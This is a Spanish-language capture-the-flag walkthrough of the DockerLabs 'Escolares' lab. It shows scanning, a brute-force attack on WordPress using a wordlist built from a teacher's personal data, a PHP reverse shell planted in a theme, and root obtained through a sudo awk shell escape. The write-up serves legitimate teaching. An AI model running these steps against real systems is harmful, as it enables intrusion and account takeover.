## Introducción

Este documento presenta la resolución completa de la máquina **Escolares**, desarrollada por *Luisillo_o* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web con una instalación de WordPress que contiene información personal de un profesor en un archivo público (`profesores.html`), lo que permite la creación de un diccionario personalizado para ataques de fuerza bruta. Tras obtener acceso al panel de WordPress, se sube una reverse shell para obtener acceso como `www-data`.
Una vez dentro, se encuentra un archivo con credenciales en texto plano que permiten acceder al usuario `luisillo`. Finalmente, se identifica una configuración insegura de `sudo` que permite ejecutar `awk` como root, facilitando la escalada de privilegios hasta obtener acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Escolares.zip
sudo bash auto_deploy.sh Escolares.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1761717544/Ip_kdnyha.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Escolares/{content,exploits,nmap,scripts}
cd Escolares
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1762126094/Ports_zjw2el.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1762126094/Gobuster_xdzjyo.png)

**Rutas destacadas:**
- `/index.php` — Página principal.
  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1762126094/IndexAlumnado_mbztfi.png)
- `/wordpress` — Instalación de WordPress.
  ![WordPress](https://res.cloudinary.com/dewqswzke/image/upload/v1762126094/IndexWordpress_m1cqmx.png)
- `/profesores.html` — Archivo con datos personales de un profesor.
  ![Profesor](https://res.cloudinary.com/dewqswzke/image/upload/v1762126094/ProfesorPista_czkyo6.png)

### 1.4 Configuración de dominio interno

Al abrir `/wordpress`, la página no carga adecuadamente, revelando un dominio interno: `escolares.dl`.

![Find Domain](https://res.cloudinary.com/dewqswzke/image/upload/v1762126093/FindDomain_vz6b1r.png)

Se agrega al `/etc/hosts`:

```bash
echo '172.17.0.2  escolares.dl' | sudo tee -a /etc/hosts
```

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Enumeración de usuarios en WordPress

Con el dominio funcionando, se ejecuta `wpscan` para enumerar usuarios:

```bash
wpscan --url http://escolares.dl/wordpress/ --enumerate u,vp
```

Salida relevante: el usuario **luisillo** es válido.

![User WordPress](https://res.cloudinary.com/dewqswzke/image/upload/v1762126097/UserWordpress_aiqsrp.png)

### 2.2 Creación de diccionario personalizado

Se utiliza **cupp** para crear un diccionario basado en los datos públicos del profesor:

```bash
cupp -i
```

![Cupp](https://res.cloudinary.com/dewqswzke/image/upload/v1762126094/Cupp_sbrlaa.png)

### 2.3 Fuerza bruta contra WordPress

```bash
wpscan --url http://escolares.dl/wordpress/ -U luisillo -P Luisillo.txt
```

![Brute force](https://res.cloudinary.com/dewqswzke/image/upload/v1762126094/Password_tyma9a.png)

Se obtiene acceso al panel de administración de WordPress.

### 2.4 Subida de reverse shell

En el panel de WordPress, se edita un archivo de tema para añadir una reverse shell en PHP:

![Reverse Shell](https://res.cloudinary.com/dewqswzke/image/upload/v1762126095/ReverseShellCode_xdul8u.png)

Se inicia un listener en la máquina atacante:

```bash
nc -nlvp 443
```

Se accede al archivo:

```
http://escolares.dl/wordpress/wp-content/themes/twentytwentyfour/shell.php
```

![www-data](https://res.cloudinary.com/dewqswzke/image/upload/v1762126097/www-data_fdlefz.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → luisillo

Se encuentra el archivo `secret.txt`:

![Secret](https://res.cloudinary.com/dewqswzke/image/upload/v1762126095/Secret_u9bx7s.png)

Se inicia sesión como el usuario `luisillo`:

```bash
su luisillo
```

![Su luisillo](https://res.cloudinary.com/dewqswzke/image/upload/v1762126097/SuLuisillo_dn1rqx.png)

### 3.2 De luisillo → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1762126095/Sudo-L_mvwg8h.png)

El usuario puede ejecutar `awk` como root sin contraseña.

Se utiliza `searchbins` para verificar la técnica en GTFOBins:

```bash
searchbins -b awk -f sudo
```

Se ejecuta el comando:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1762126094/Root_somoyr.png)
